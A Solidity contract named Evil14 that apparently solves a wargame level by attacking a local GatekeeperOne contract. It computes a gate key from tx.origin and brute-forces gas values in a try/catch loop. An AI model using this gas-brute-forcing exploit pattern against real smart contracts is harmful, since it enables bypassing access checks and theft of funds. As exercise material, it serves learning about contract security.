// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./GatekeeperOne.sol";
import "hardhat/console.sol";

contract Evil14 {
    GatekeeperOne target;

    constructor(address _target) public {
        target = GatekeeperOne(_target);
    }

    function getMagicNum() public view returns(uint16) {
        return uint16(tx.origin);
    }

    function getKey() public view returns(bytes8) {
        uint16 magicNum = getMagicNum();
        return bytes8(uint64(magicNum));
    }

    function hackit() external {
        bytes8 gateKey = getKey();

        for(uint i = 0; i <= 8191; i++) {
           try target.enter{gas: 8444+i}(gateKey, i) {
           } catch  {
           }
        }
    }
}
